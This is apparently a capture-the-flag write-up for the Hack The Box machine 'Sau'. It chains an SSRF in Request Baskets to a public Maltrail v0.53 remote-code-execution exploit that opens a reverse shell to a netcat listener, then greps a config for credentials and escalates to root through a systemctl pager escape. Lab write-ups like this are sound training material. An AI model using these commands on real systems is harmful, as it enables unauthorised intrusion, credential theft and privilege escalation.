## Box: Sau

## Target IP: `10.10.11.224`

---

### Preparation

Added to `/etc/hosts`:

```
10.10.11.224 sau.htb
```

---

### Initial Nmap Scan

Ran:

```bash
sudo nmap -sC -sV -p- --min-rate 10000 sau.htb
```

Results:

| Port | Service | Version |
| --- | --- | --- |
| 22 | ssh | OpenSSH (Ubuntu) |
| 80 | http | filtered |
| 55555 | http | - |

---

### Web Enumeration

Accessed:

```
http://sau.htb:55555/
```

Found **Request Basket** service.

Created a basket. Got a token.

Server showed received HTTP headers when requests were made to the basket.

---

### SSRF Discovery

Intercepted basket creation in Burp.

Found `forward_url` field.

Set `forward_url` to:

```
http://127.0.0.1
```

Confirmed server-side request forgery (SSRF) when server connected back to internal services.

Accessed internal webserver behind port 80:

Maltrail v0.53 showed on the page footer.

---

### Exploitation

Searched for Maltrail 0.53 vulnerabilities.

Found RCE exploit:

```bash
https://github.com/spookier/Maltrail-v0.53-Exploit
```

Downloaded exploit script.

Set up Netcat listener:

```bash
nc -lvnp 4444
```

Adjusted basket’s forward URL to:

```
http://127.0.0.1/login
```

Launched exploit:

```bash
python3 exploit.py 10.10.14.15 4444 "http://10.10.11.224:55555/r22f72i/"
```

Shell landed.

---

### Shell Stabilization

Ran:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL-Z
stty raw -echo
fg
export TERM=xterm
```

Got stable TTY.

---

### Post-Exploitation

Searched for passwords:

```bash
grep -B5 -A5 -i password maltrail.conf | sed 's/ //g' | sort -u | less
```

Found credentials:

```
admin:9ab3cd9d67bf49d01f6a2e33d0bd9bc804ddbe6ce1ff5d219c42624851db5dbc:0:#changeme!
```

Checked sudo permissions:

```bash
sudo -l
```

Allowed to run:

```
sudo systemctl status trail.service
```

---

### Privilege Escalation

Ran:

```bash
sudo systemctl status trail.service
```

Dropped into a pager.

Escaped with:

```bash
! /bin/sh
```

Once shell popped, confirmed:

```bash
whoami
```

Output:

```
root
```

---

### Flags

Grabbed:

```bash
cd /root
cat root.txt
```

Box finished.
